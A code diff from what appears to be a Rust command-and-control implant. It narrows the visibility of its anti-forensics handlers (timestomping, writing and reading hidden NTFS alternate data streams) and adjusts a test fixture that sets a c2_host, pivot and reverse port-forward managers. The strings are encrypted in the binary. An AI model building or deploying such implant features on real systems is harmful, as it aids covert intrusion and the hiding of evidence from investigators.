@@ -545,7 +545,7 @@ pub async fn handle_recursive_download(ctx: &HandlerContext, cmd: &str, req_id: 
 
 // ── Artifacts (timestomp, secure_delete, ADS) ──────────────────────────
 
-pub fn handle_timestomp(cmd: &str) -> DispatchResult {
+pub(crate) fn handle_timestomp(cmd: &str) -> DispatchResult {
     let parts: Vec<&str> = cmd.split_whitespace().collect();
     if parts.len() != 3 {
         return DispatchResult::Reply(String::new(), aes_str!("Usage: timestomp <target> <reference_file>"), 1, AgentAction::None);
@@ -553,7 +553,7 @@ pub fn handle_timestomp(cmd: &str) -> DispatchResult {
     wrap_result(artifacts::timestomp_copy(parts[1], parts[2]))
 }
 
-pub fn handle_timestomp_set(cmd: &str) -> DispatchResult {
+pub(crate) fn handle_timestomp_set(cmd: &str) -> DispatchResult {
     let parts: Vec<&str> = cmd.split_whitespace().collect();
     if parts.len() != 3 {
         return DispatchResult::Reply(String::new(), aes_str!("Usage: timestomp:set <path> <unix_epoch>"), 1, AgentAction::None);
@@ -564,7 +564,7 @@ pub fn handle_timestomp_set(cmd: &str) -> DispatchResult {
     }
 }
 
-pub fn handle_ads_write(cmd: &str) -> DispatchResult {
+pub(crate) fn handle_ads_write(cmd: &str) -> DispatchResult {
     let parts: Vec<&str> = cmd.split_whitespace().collect();
     if parts.len() != 4 {
         return DispatchResult::Reply(String::new(), aes_str!("Usage: ads:write <path> <stream_name> <b64_data>"), 1, AgentAction::None);
@@ -575,7 +575,7 @@ pub fn handle_ads_write(cmd: &str) -> DispatchResult {
     }
 }
 
-pub fn handle_ads_read(cmd: &str) -> DispatchResult {
+pub(crate) fn handle_ads_read(cmd: &str) -> DispatchResult {
     let parts: Vec<&str> = cmd.split_whitespace().collect();
     if parts.len() != 3 {
         return DispatchResult::Reply(String::new(), aes_str!("Usage: ads:read <path> <stream_name>"), 1, AgentAction::None);
@@ -586,7 +586,7 @@ pub fn handle_ads_read(cmd: &str) -> DispatchResult {
     }
 }
 
-pub fn handle_ads_list(path: &str) -> DispatchResult {
+pub(crate) fn handle_ads_list(path: &str) -> DispatchResult {
     match artifacts::ads_list(path) {
         Ok(streams) if streams.is_empty() => DispatchResult::Reply(aes_str!("No alternate data streams found"), String::new(), 0, AgentAction::None),
         Ok(streams) => DispatchResult::Reply(streams.join("\n"), String::new(), 0, AgentAction::None),
@@ -883,7 +883,7 @@ mod tests {
             proxy_handle: Arc::new(Mutex::new(None)),
             rportfwd_handles: Arc::new(Mutex::new(Vec::new())),
             ext_manager: Arc::new(Mutex::new(crate::agent::scripting::ExtensionManager::new())),
-            job_manager: Arc::new(Mutex::new(crate::agent::jobs::JobManager::new(tx.clone()))),
+            job_manager: crate::agent::jobs::JobManager::new_shared(tx.clone()),
             c2_host: "127.0.0.1".to_string(),
             tx: tx.clone(),
             pivot_mgr: Arc::new(tokio::sync::Mutex::new(crate::agent::pivot::PivotManager::new(tx))),
